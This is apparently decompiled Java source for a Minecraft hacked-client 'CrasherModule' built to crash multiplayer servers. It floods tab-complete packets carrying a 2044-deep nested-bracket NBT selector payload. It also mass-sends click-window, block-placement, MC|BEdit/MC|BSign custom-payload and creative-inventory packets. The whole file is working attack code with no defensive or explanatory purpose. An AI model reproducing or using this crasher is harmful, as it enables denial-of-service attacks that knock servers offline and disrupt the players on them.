   public CrasherModule() {
      this.addSettings(
         new ModuleSettings[]{
            this.mode,
            this.payloadMode,
            this.packetSize,
            this.packets,
            this.unicodePacket,
            this.extraPacket,
            this.randomPacket,
            this.sizePacket,
            this.clickWindow,
            this.blockPlacement,
            this.customPayload,
            this.creativeInventoryAction,
            this.autoDisable
         }
      );
   }

   @EventListener
   public void onWorldChange(EventWorldChange e) {
      this.toggle();
   }

   @EventListener
   public void onUpdate(EventUpdate e) {
      String var2;
      switch ((var2 = this.mode.getMode().toLowerCase()).hashCode()) {
         case -786701938:
            if (var2.equals("payload")) {
               this.th = new CrasherModule.PayloadThread();
               this.th.start();
            }
            break;
         case 3536713:
            if (var2.equals("spam")) {
               String in = IntStream.range(0, 2044).mapToObj(ix -> "[").collect(Collectors.joining());
               String spam = "{a:" + in + "}";
               String cmd = new String("msg @a[nbt={PAYLOAD}]").replace("{PAYLOAD}", spam);

               for (int i = 0; (double)i < this.packets.value; i++) {
                  this.mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C14PacketTabComplete(cmd, this.mc.thePlayer.getPosition()));
               }
            }
      }

      if (this.autoDisable.isEnabled()) {
         this.toggle();
      }
   }

   public void sendPackets() {
      String payloadText = "";
      String var2;
      switch ((var2 = this.payloadMode.getMode().toLowerCase()).hashCode()) {
         case 93613420:
            if (var2.equals("bedit")) {
               payloadText = "MC|BEdit";
            }
            break;
         case 94035231:
            if (var2.equals("bsign")) {
               payloadText = "MC|BSign";
            }
      }

      if (this.clickWindow.isEnabled()) {
         for (int f = 0; (double)f < this.packets.value; f++) {
            this.mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C0EPacketClickWindow(0, 0, 0, 6, this.stack, (short)0));
         }
      }

      if (this.blockPlacement.isEnabled()) {
         for (int f = 0; (double)f < this.packets.value; f++) {
            this.mc
               .getNetHandler()
               .getNetworkManager()
               .sendPacketNoEvent(
                  new C08PacketPlayerBlockPlacement(
                     new BlockPos(this.mc.thePlayer.posX, this.mc.thePlayer.posY - 2.0, this.mc.thePlayer.posZ), 1, this.stack, 0.0F, 0.0F, 0.0F
                  )
               );
         }
      }

      if (this.customPayload.isEnabled()) {
         for (int f = 0; (double)f < this.packets.value; f++) {
            this.mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C17PacketCustomPayload(payloadText, this.buffer));
         }
      }

      if (this.creativeInventoryAction.isEnabled()) {
         for (int f = 0; (double)f < this.packets.value; f++) {
            this.mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C10PacketCreativeInventoryAction(5, this.stack));
         }
      }
   }

